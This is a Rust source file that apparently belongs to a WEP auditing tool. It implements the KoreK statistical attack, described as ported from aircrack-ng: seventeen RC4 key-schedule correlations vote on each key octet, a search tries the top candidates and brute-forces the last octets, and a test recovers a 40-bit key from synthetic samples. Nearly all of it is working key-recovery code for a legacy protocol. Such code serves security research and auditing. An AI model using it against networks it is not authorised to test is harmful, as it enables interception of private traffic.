//! The KoreK attacks (FR-ATK-KOREK-1): 17 RC4 key-schedule correlations that
//! recover the WEP secret octet by octet from the first two keystream octets.
//!
//! Each captured IV runs the KSA forward over `IV || secret[0..b]`; the 17 KoreK
//! correlations each cast a weighted vote for `secret[b]`, summed with the
//! `K_COEFF` reliability weights (the A_neg correlation votes *against* false
//! positives with weight -20). The most-voted value per octet is recovered.
//! Ported from aircrack-ng's `crack_wep_thread` correlation block and `K_COEFF`
//! (`src/aircrack-ng/aircrack-ng.c`, C5).
#![allow(
    clippy::indexing_slicing,
    clippy::cast_possible_truncation,
    clippy::many_single_char_names,
    clippy::doc_markdown,
    reason = "byte-permute KSA using the conventional RC4 single-octet names (s, j, i, q, k); KoreK and the A_* correlations are attack names, not code identifiers"
)]

use super::Attack;
use crate::model::{BssidWep, IvSample, KeyLen, WepKey};
use crate::wep::Verifier;

// K_COEFF reliability weights, indexed exactly as aircrack's enum KoreK_attacks.
const C_U15: i32 = 15;
const C_S13: i32 = 13;
const C_U13_1: i32 = 12;
const C_U13_2: i32 = 12;
const C_U13_3: i32 = 12;
const C_S5_1: i32 = 5;
const C_S5_2: i32 = 5;
const C_S5_3: i32 = 5;
const C_U5_1: i32 = 3;
const C_U5_2: i32 = 4;
const C_U5_3: i32 = 3;
const C_U5_4: i32 = 4;
const C_S3: i32 = 3;
const C_4_S13: i32 = 13;
const C_4_U5_1: i32 = 4;
const C_4_U5_2: i32 = 4;
const C_NEG: i32 = -20;

/// The KoreK statistical attack with aircrack-style fudge / bruteforce tuning.
#[derive(Debug, Clone, Copy, Default)]
pub struct KorekAttack {
    /// Candidate-search tuning (`-f` ratio-fudge, `-x` tail bruteforce, `-c`).
    pub tuning: super::Tuning,
}

impl Attack for KorekAttack {
    fn name(&self) -> &'static str {
        "korek"
    }

    fn applicable(&self, bssid: &BssidWep, len: KeyLen) -> bool {
        super::worth_attempting(bssid, len)
    }

    fn needs_convergence(&self) -> bool {
        true
    }

    fn run(&self, bssid: &BssidWep, len: KeyLen, verifier: &Verifier) -> Option<WepKey> {
        let n = len.byte_len();
        let alnum = self.tuning.alnum;
        // In the quick pass, only the argmax per octet is tried (ffact 1, no tail
        // brute, small budget) so a wrong key length fails fast; the full pass does
        // the adaptive fudge backtracking and the last-keybyte sweep (FR-PERF-3).
        let quick = super::quick();
        let ffact = if quick { 1.0 } else { self.tuning.ffact_for(len) };
        let brute_tail = if quick { 1.min(n) } else { self.tuning.brute_tail.min(n) };
        // Tally over distinct IVs only -- reused IVs would bias the votes (C5).
        let samples = super::unique_samples(bssid.ivs(), bssid.arp_keystreams());
        let mut secret = vec![0u8; n];
        // The per-BSSID deadline (FR-PERF-3) bounds wall-clock; this only caps the
        // absolute node count, generous enough for the search plus a tail brute.
        let mut budget: u32 = if quick { 1 << 17 } else { 1 << 24 };
        search(&samples, &mut secret, 0, ffact, brute_tail, alnum, verifier, &mut budget)
    }
}

/// Sequentially recover the secret. For the early octets, tally the KoreK votes
/// for the recovered prefix and try the adaptive ratio-fudge candidates (every
/// value within a factor `ffact` of the top); the last `brute_tail` octets are
/// instead brute-forced over the whole keyspace, since their statistical signal
/// is weakest (aircrack `-f` / `-x`). The argmax is tried first, so a clean
/// signal cracks without backtracking.
#[allow(
    clippy::too_many_arguments,
    reason = "internal recursive search; the parameters are the per-position state and the resolved -f/-x/-c tuning"
)]
fn search(
    samples: &[IvSample],
    secret: &mut [u8],
    pos: usize,
    ffact: f32,
    brute_tail: usize,
    alnum: bool,
    verifier: &Verifier,
    budget: &mut u32,
) -> Option<WepKey> {
    if *budget == 0 || super::deadline_passed() {
        return None;
    }
    *budget -= 1;
    if pos == secret.len() {
        let key = WepKey::new(secret)?;
        return verifier.accept(&key).then_some(key);
    }
    let candidates = if pos + brute_tail >= secret.len() {
        super::keyspace_bytes(alnum)
    } else {
        let mut poll = [0i32; 256];
        for sample in samples {
            let keystream = sample.keystream();
            if keystream.len() >= 2 {
                korek_votes(sample.iv, keystream[0], keystream[1], &secret[..pos], pos, &mut poll);
            }
        }
        super::fudge_candidates(&poll, ffact, alnum)
    };
    for candidate in candidates {
        secret[pos] = candidate;
        if let Some(found) = search(samples, secret, pos + 1, ffact, brute_tail, alnum, verifier, budget) {
            return Some(found);
        }
    }
    None
}

/// The 17 KoreK correlations for one IV, adding weighted votes for `secret[b]`.
/// `ks0`/`ks1` are the first two keystream octets (already XOR-ed with the SNAP
/// header). `prefix` is the recovered `secret[0..b]`.
fn korek_votes(iv: [u8; 3], ks0: u8, ks1: u8, prefix: &[u8], b: usize, poll: &mut [i32; 256]) {
    let q = 3 + b;
    // KSA forward over IV || prefix, retaining the j value at each step.
    let mut s: [u8; 256] = core::array::from_fn(|i| i as u8);
    let mut jj = [0u8; 256];
    let mut j = 0u8;
    for i in 0..q {
        let k = if i < 3 { iv[i] } else { prefix[i - 3] };
        j = j.wrapping_add(s[i]).wrapping_add(k);
        jj[i] = j;
        s.swap(i, usize::from(j));
    }
    // Inverse permutation by replaying the swaps in reverse.
    let mut si: [u8; 256] = core::array::from_fn(|i| i as u8);
    for i in (0..q).rev() {
        si.swap(i, usize::from(jj[i]));
    }

    let qb = q as u8;
    let o1 = ks0;
    let io1 = si[usize::from(o1)];
    let s1 = s[1];
    let o2 = ks1;
    let io2 = si[usize::from(o2)];
    let s2 = s[2];
    let sq = s[q];
    let dq = sq.wrapping_add(jj[q - 1]);

    // Closure-free helper: add `coeff` to the candidate `kq`.
    let mut vote = |kq: u8, coeff: i32| poll[usize::from(kq)] += coeff;

    if s2 == 0 {
        if s1 == 2 && o1 == 2 {
            vote(1u8.wrapping_sub(dq), C_NEG);
            vote(2u8.wrapping_sub(dq), C_NEG);
        } else if o2 == 0 {
            vote(2u8.wrapping_sub(dq), C_NEG);
        }
    } else if o2 == 0 && sq == 0 {
        vote(2u8.wrapping_sub(dq), C_U15);
    }

    if s1 == 1 && o1 == s2 {
        vote(1u8.wrapping_sub(dq), C_NEG);
        vote(2u8.wrapping_sub(dq), C_NEG);
    }
    if s1 == 0 && s[0] == 1 && o1 == 1 {
        vote(0u8.wrapping_sub(dq), C_NEG);
        vote(1u8.wrapping_sub(dq), C_NEG);
    }
    if s1 == qb {
        if o1 == qb {
            vote(si[0].wrapping_sub(dq), C_S13);
        } else if 1u8.wrapping_sub(qb).wrapping_sub(o1) == 0 {
            vote(io1.wrapping_sub(dq), C_U13_1);
        } else if io1 < qb {
            let jq = si[usize::from(io1.wrapping_sub(qb))];
            if jq != 1 {
                vote(jq.wrapping_sub(dq), C_U5_1);
            }
        }
    }
    if io1 == 2 && sq == 1 {
        vote(1u8.wrapping_sub(dq), C_U5_2);
    }
    if sq == qb {
        if s1 == 0 && o1 == qb {
            vote(1u8.wrapping_sub(dq), C_U13_2);
        } else if 1u8.wrapping_sub(qb).wrapping_sub(s1) == 0 && o1 == s1 {
            vote(1u8.wrapping_sub(dq), C_U13_3);
        } else if s1 >= qb.wrapping_neg() && qb.wrapping_add(s1).wrapping_sub(io1) == 0 {
            vote(1u8.wrapping_sub(dq), C_U5_3);
        }
    }
    if s1 < qb && s1.wrapping_add(s[usize::from(s1)]).wrapping_sub(qb) == 0 && io1 != 1 && io1 != s[usize::from(s1)] {
        vote(io1.wrapping_sub(dq), C_S5_1);
    }
    if s1 > qb && s2.wrapping_add(s1).wrapping_sub(qb) == 0 {
        if o2 == s1 {
            let jq = si[usize::from(s1.wrapping_sub(s2))];
            if jq != 1 && jq != 2 {
                vote(jq.wrapping_sub(dq), C_S5_2);
            }
        } else if o2 == 2u8.wrapping_sub(s2) {
            let jq = io2;
            if jq != 1 && jq != 2 {
                vote(jq.wrapping_sub(dq), C_S5_3);
            }
        }
    }
    if s[1] != 2 && s[2] != 0 {
        let j2 = s[1].wrapping_add(s[2]);
        if j2 < qb {
            let t2 = s[usize::from(j2)].wrapping_add(s[2]);
            if t2 == qb && io2 != 1 && io2 != 2 && io2 != j2 {
                vote(io2.wrapping_sub(dq), C_S3);
            }
        }
    }
    if s1 == 2 {
        if qb == 4 {
            if o2 == 0 {
                vote(si[0].wrapping_sub(dq), C_4_S13);
            } else {
                if jj[1] == 2 && io2 == 0 {
                    vote(si[254].wrapping_sub(dq), C_4_U5_1);
                }
                if jj[1] == 2 && io2 == 2 {
                    vote(si[255].wrapping_sub(dq), C_4_U5_2);
                }
            }
        } else if qb > 4 && s[4].wrapping_add(2) == qb && io2 != 1 && io2 != 4 {
            vote(io2.wrapping_sub(dq), C_U5_4);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::KorekAttack;
    use crate::attack::Attack;
    use crate::crypto::{Rc4, crc32};
    use crate::model::{BssidWep, EncFrame, IvSample, KeyLen, WepKey};
    use crate::wep::Verifier;

    fn samples(key: &[u8], n: u32) -> Vec<IvSample> {
        (0..n)
            .map(|c| {
                let iv = [c as u8, (c >> 8) as u8, (c >> 16) as u8];
                let mut seed = iv.to_vec();
                seed.extend_from_slice(key);
                let mut ks = [0u8; 2];
                Rc4::new(&seed).keystream(&mut ks);
                IvSample::new(iv, &ks)
            })
            .collect()
    }

    fn verifier_for(key: &[u8]) -> Verifier {
        let frames = [[1u8, 2, 3], [4, 5, 6]]
            .iter()
            .map(|iv| {
                let plain = b"\xaa\xaa\x03\x00\x00\x00 verifier frame body";
                let mut data = plain.to_vec();
                data.extend_from_slice(&crc32(plain).to_le_bytes());
                let mut seed = iv.to_vec();
                seed.extend_from_slice(key);
                Rc4::new(&seed).apply_keystream(&mut data);
                EncFrame { iv: *iv, data, key_id: 0 }
            })
            .collect();
        Verifier::new(frames)
    }

    #[test]
    fn korek_recovers_wep40() {
        let key = [0x64u8, 0x33, 0xa1, 0x07, 0xfe];
        let bssid =
            BssidWep::with_material(crate::model::WepMaterial { ivs: samples(&key, 120_000), ..Default::default() });
        let recovered = KorekAttack::default().run(&bssid, KeyLen::Wep40, &verifier_for(&key));
        assert_eq!(recovered.as_ref().map(WepKey::as_slice), Some(key.as_slice()));
    }
}
